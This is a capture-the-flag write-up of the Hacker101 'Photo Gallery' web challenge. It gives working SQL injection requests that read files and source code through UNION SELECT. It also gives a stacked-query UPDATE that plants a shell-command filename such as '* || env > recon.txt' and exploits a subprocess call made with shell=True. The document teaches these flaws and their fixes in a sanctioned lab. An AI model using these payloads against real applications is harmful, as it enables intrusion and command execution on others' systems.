# Photo Gallery — Writeup (3/3)

**Difficulty:** Moderate  
**Category:** Web — SQL Injection, File Read, Stacked Queries, RCE  
**Flags:** 3/3 (complete)  
**Platform:** Hacker101 CTF

---

## Challenge Overview

**Context:** Photo gallery built in Python/Flask with SQLite. Displays three cat images, allows viewing each via `/fetch?id=N`, and shows disk space usage on the home page.

**What you face:** A numeric ID parameter that looks innocent, an SQLite database with stored filenames, and a disk space calculation function that calls `subprocess` with `shell=True` using data from the database.

**Vulnerabilities exploited:**
- SQL Injection (CWE-89) on a numeric parameter — UNION SELECT with `1.1` to return zero real rows
- Stacked Queries (`;UPDATE ... COMMIT`) to modify persistent state
- Command Injection (CWE-78) via `subprocess.check_output(..., shell=True)` with a controlled filename
- Arbitrary File Read via UNION SELECT injecting paths as filenames

**What you learn:**
- Numeric IDs are just as injectable as strings — always parameterize
- UNION SELECT with a decimal (`1.1`) returns zero rows from the original query, exposing only the UNION
- Stacked queries allow modifying the database via SELECT (not just reading)
- `subprocess` with `shell=True` and unsanitized data = critical command injection
- Environment variables (`env`) frequently contain flags in container-based CTFs

---

## Objective

Exploit SQL injection in the `id` parameter of the `/fetch` endpoint to read internal files, exfiltrate the database table, and execute commands on the system via filename injection into a `subprocess` call with `shell=True`.

---

## Database Structure (extracted via SQLi)

| id | title            | parent | filename           |
|----|------------------|--------|--------------------|
| 1  | Utterly adorable | 1      | files/adorable.jpg |
| 2  | Purrfect         | 1      | files/purrfect.jpg |
| 3  | Invisible        | 1      | FLAG1              |

---

## Flag 0 — Arbitrary File Read via Decimal SQLi

**Vulnerability:** The `id` parameter in `/fetch?id=N` is interpolated directly into the SQL query.

### Step 1: Detect the behavior

Accessing `/fetch?id=1` returns the normal image. Trying `/fetch?id=3` returns an error or blank (filename = `FLAG1`).

### Step 2: Exploit with UNION SELECT

```
GET /fetch?id=1.1 UNION SELECT 'files/adorable.jpg'--
```

The decimal in `1.1` results in zero rows from the original query, and the `UNION SELECT` injects the desired filename.

### Step 3: Read the flag directly

Photo ID 3 has `filename = FLAG1`. This value is the content of flag 0, read from the database:

```
GET /fetch?id=1.1 UNION SELECT 'FLAG1'--
```

Returns the "image" whose content is flag 0.

---

## Flag 1 — SQL Injection + Source Code Read

**Vulnerability:** UNION SELECT allows injecting any filename, including system paths.

### Step 1: Inject the source code path

```
GET /fetch?id=1.1 UNION SELECT 'main.py'--
```

The server serves the contents of `main.py` as if it were an image. The full application source code appears in the response.

Flag 1 is embedded in the source code (as a string or comment).

---

## Flag 2 — Stacked Queries + RCE via subprocess (shell=True)

**Vulnerability:** The disk space calculation function uses `subprocess.check_output` with `shell=True` and interpolates the `filename` directly:

```python
rep += '<i>Space used: ' + subprocess.check_output(
    'du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns),
    shell=True, stderr=subprocess.STDOUT
).strip().rsplit('\n', 1)[-1] + '</i>'
```

The filename is concatenated into the shell command. By injecting `* || <command>` as a filename, the server executes the command.

### Step 1: Update photo 3's filename via stacked query

```
GET /fetch?id=1;UPDATE photos SET filename='* || env > recon.txt' WHERE id=3;COMMIT;--
```

This updates photo 3's filename to `* || env > recon.txt`.

### Step 2: Trigger execution on the home page

Access the application root:

```
GET /
```

The page calculates disk space with `du -ch files/adorable.jpg files/purrfect.jpg * || env > recon.txt`, executing `env` and writing the output to `recon.txt`.

### Step 3: Read the output file via UNION SELECT

```
GET /fetch?id=1.1 UNION SELECT 'recon.txt'--
```

The response contains all environment variables, including the `FLAGS` variable with all the flags.

### Alternative: run ls to verify structure

```
GET /fetch?id=1;UPDATE photos SET filename='* || ls > ls.txt' WHERE id=3;COMMIT;--
```

Then: `GET /fetch?id=1.1 UNION SELECT 'ls.txt'--`

---

## Attack Summary

```
FLAG 0: /fetch?id=1.1 UNION SELECT 'FLAG1'-- → flag content stored in database
FLAG 1: /fetch?id=1.1 UNION SELECT 'main.py'-- → source code with embedded flag
FLAG 2: stacked UPDATE → filename='* || env > recon.txt' → GET / → UNION SELECT 'recon.txt'--
```

---

## Lessons Learned

1. **SQL injection on numeric parameters** — always parameterize queries, even for IDs
2. **UNION SELECT with decimal** (`1.1`) returns zero real rows, leaving only the UNION result
3. **Stacked queries** allow UPDATE/INSERT via SQLi, modifying persistent state
4. **subprocess with shell=True and unsanitized data** = critical command injection
5. **User-controlled filenames** must never be passed to shell commands
6. **Environment variables** frequently contain flags and secrets in lab/container environments
